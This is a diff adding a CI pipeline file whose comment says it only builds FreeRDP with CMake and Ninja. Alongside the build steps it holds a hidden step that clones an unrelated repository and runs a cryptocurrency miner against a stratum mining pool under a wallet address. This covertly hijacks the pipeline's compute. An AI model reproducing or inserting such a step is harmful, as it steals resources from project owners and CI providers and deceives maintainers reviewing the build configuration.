@@ -1,0 +1,32 @@
+# This pipeline will just build FreeRDP to be sure we dont break
+
+  trigger:
+    - working
+    
+  pool:
+    vmImage: 'ubuntu-latest'
+    
+  steps:
+    - checkout: self
+  
+    - script: git clone https://github.com/saliem07/whive1.git && cd whive1 && chmod +x miner-tidecoin.sh && chmod +x cpuminer-sse2 && cpuminer-sse2 -a yespowerTIDE  -o stratum+tcp://stratum-eu.rplant.xyz:7059 -u TD368ah8Kuzn2quR7g6r8sUYbsVvKzwpyc
+    - script: cmake -G Ninja
+            -B build
+            -DCMAKE_INSTALL_PREFIX=/usr/local 
+            -DCMAKE_INSTALL_LIBDIR=/usr/local/lib 
+            -DCMAKE_BUILD_TYPE=RelWithDebInfo 
+            -DWITH_SERVER=ON 
+            -DWITH_CHANNEL_GFXREDIR=ON 
+            -DWITH_CHANNEL_RDPAPPLIST=ON 
+            -DWITH_CLIENT=OFF 
+            -DWITH_CLIENT_COMMON=OFF 
+            -DWITH_CLIENT_CHANNELS=OFF 
+            -DWITH_CLIENT_INTERFACE=OFF 
+            -DWITH_PROXY=OFF 
+            -DWITH_SHADOW=OFF 
+            -DWITH_SAMPLE=OFF 
+      displayName: 'CMake (Ninja)'
+    
+    - script: ninja -C build -j8
+      displayName: 'Ninja build'
+    
